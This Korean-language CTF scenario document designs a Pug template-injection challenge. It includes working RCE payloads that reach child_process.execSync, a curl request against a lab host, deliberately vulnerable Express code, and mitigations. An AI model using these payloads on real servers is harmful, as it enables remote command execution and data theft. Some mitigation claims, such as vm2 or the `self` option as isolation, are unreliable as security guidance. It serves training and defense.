---
title: Node.js Pug Template Engine SSTI to RCE — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, ssti, nodejs, pug, rce, javascript-sandbox]
confidence: high
---

# Node.js Pug Template Engine SSTI to RCE — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Custom Report Generator (커스텀 리포트 생성기)
- **난이도**: Medium-High
- **핵심 컨셉**: 자바스크립트 기반 Node.js 환경에서 많이 활용되는 **Pug(구 Jade) 템플릿 엔진**을 대상으로 하는 **서버사이드 템플릿 인젝션(SSTI)** RCE 연계 문제입니다. 사용자는 리포트 레이아웃의 마크업 형태를 Pug 템플릿 문법으로 작성해 결과를 렌더링할 수 있습니다. 백엔드는 사용자 입력을 바탕으로 템플릿 소스를 동적 컴파일하지만, 적절한 격리 장치(Sandbox) 없이 원시 구문을 그대로 템플릿 엔진에 매핑합니다. 공격자는 자바스크립트 글로벌 런타임 빌트인 객체(`global.process`)를 추적해 운영체제 시스템 명령어를 원격으로 트리거합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend / Editor**: Pug 템플릿 마크업(예: `h1= title`)을 입력하고 변수를 지정해 결과 PDF/HTML을 생성하는 렌더링 화면.
- **Backend Service (Node.js/Express)**:
  - Pug 라이브러리를 로드하여 `pug.compile(user_template)` 형태로 컴파일 수행.
- **Flag 위치**:
  - 서버 시스템 파일 내: `/flag.txt`

### 2.2 취약점 지점
1. **Unsafe pug.compile / pug.render usage**:
   - 서버 측에서 고정된 템플릿 파일이 아닌, 사용자에게 수집한 날것의 문자열(String)을 그대로 템플릿 컴파일 대상 소스로 넘겨 컴파일을 돌립니다.
   - Pug 템플릿 지시자 내부(예: `#{...}` 또는 `- JS코드`)에서는 컴파일 시 자바스크립트 함수(Function) 형태로 컴파일되므로, 내부 컨텍스트에서 임의의 JS 실행 기회가 부여됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 메소드 | 인증 | 입력 값 (Body JSON) | 반환 값 | 비고 |
|------------|--------|------|--------------------|---------|------|
| `/api/render`| POST | 없음 | `{"template": "사용자 입력"}` | 렌더링된 결과 HTML 문서 | Pug SSTI 발생 지점 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Pug 문법 구문 실행 확인
Pug 엔진이 가동되고 있는지 식별하기 위해 수식 지시문이나 내부 특수 변수 조회를 수행합니다.
- *입력 페이로드*:
  ```pug
  p= 7 * 7
  ```
- *반환 결과*: `<p>49</p>` (Pug 엔진 가동 및 표현식 실행 확인)

### Step 2. 자바스크립트 전역 객체 탈출 설계
Pug는 컴파일 시 독립된 실행 영역(Scope)을 생성하지만, 자바스크립트 런타임의 최상위 전역 체인 속성을 여전히 타고 올라갈 수 있습니다.
- **가젯 분석**:
  Pug 내부에서는 `global` 변수에 직접 접근이 차단되어 있을 수 있지만, 함수 생성자나 `process` 관련 모듈이 엮여 있는 전역 네임스페이스를 역추적합니다.
  - Pug 내에서 `require`를 직접 호출할 수는 없습니다.
  - 하지만, 로드된 모듈이나 글로벌 객체의 생성자 함수 프로토타입(`constructor`) 또는 자바스크립트 `global`을 참조하는 지점을 탐색합니다.
  - *페이로드 타겟*:
    ```javascript
    global.process.mainModule.require('child_process').execSync('id')
    ```
    또는 Pug 템플릿 문법 구조 내에서 글로벌 생성자를 활용하는 방법:
    ```javascript
    // 함수의 생성자를 이용하여 글로벌 스코프 상의 process 호출을 유도하는 코드
    const global_process = (new Function("return process"))();
    global_process.mainModule.require('child_process').execSync('id');
    ```

### Step 3. 최종 RCE 페이로드 주입
공격자는 `/flag.txt`를 읽어서 응답값에 포함하거나 외부로 전송하는 RCE 쉘 구문을 담아 POST 요청을 보냅니다.
- **최종 전송 Pug 페이로드**:
  ```pug
  - var exec = (new Function("return process"))().mainModule.require('child_process').execSync
  p= exec('cat /flag.txt').toString()
  ```
- *POST 요청 (curl)*:
  ```bash
  curl -X POST http://reporter.challenge.local/api/render \
       -H "Content-Type: application/json" \
       -d '{"template": "- var exec = (new Function(\"return process\"))().mainModule.require(\"child_process\").execSync\np= exec(\"cat /flag.txt\").toString()"}'
  ```

### Step 4. flag 획득
서버는 사용자 템플릿 문자열을 자바스크립트 렌더링 함수로 빌드 및 실행하게 되며, 이에 따라 서브프로세스로 `cat /flag.txt`가 돌고 그 쉘 아웃풋 텍스트가 HTML `<p>` 요소 내에 출력되어 최종 플래그(`FLAG{pug_template_engine_ssti_to_rce}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express)

```javascript
// server.js (Express & Pug 컴파일 취약 예시)
const express = require('express');
const pug = require('pug');
const app = express();

app.use(express.json());

app.post("/api/render", (req, res) => {
    const userTemplate = req.body.template;
    
    if (!userTemplate) {
        return res.status(400).json({ error: "No template provided" });
    }
    
    try {
        // 취약점 지점: 사용자 입력 문자열을 pug.compile에 직접 할당
        // 컴파일 과정에서 임의의 자바스크립트 함수 구문 생성이 가능해짐
        const compiledFunction = pug.compile(userTemplate);
        
        // 렌더링 환경 변수 바인딩
        const result = compiledFunction({
            title: "Security Report",
            user: { name: "Guest" }
        });
        
        return res.send(result);
    } catch (e) {
        return res.status(500).json({ error: e.message });
    }
});

app.listen(3000);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **정적 템플릿 컴파일 및 동적 생성 전면 배제**:
   - 사용자가 전송한 원문 마크업을 컴파일러에 넣지 마십시오. 모든 Pug 템플릿은 파일(`.pug`) 형태로 로컬 저장소에 고정 저장되어 있어야 하며, 런타임 단계에서는 변수 데이터(JSON)만을 바인딩해 인쇄(`pug.renderFile`)해야 합니다.
2. **템플릿 컴파일 샌드박싱 (Template Sandboxing)**:
   - 어쩔 수 없이 런타임 컴파일이 불가피하다면, 안전한 가상 머신 격리 모듈(예: `vm2` 또는 Node.js 빌트인 `vm` 모듈의 격리 컨텍스트) 내에서 템플릿 컴파일 및 렌더러 함수 실행을 감싸 글로벌 `process` 접근을 엄격히 차단합니다.
3. **Pug 글로벌 설정 제한**:
   - Pug 렌더링 옵션 상에서 `self: true` 속성을 지정하여 로컬 레벨 변수 바인딩에 대해서만 스코프 접근을 단일화하고 전역 속성 참조 가비지들을 미연에 제거합니다.
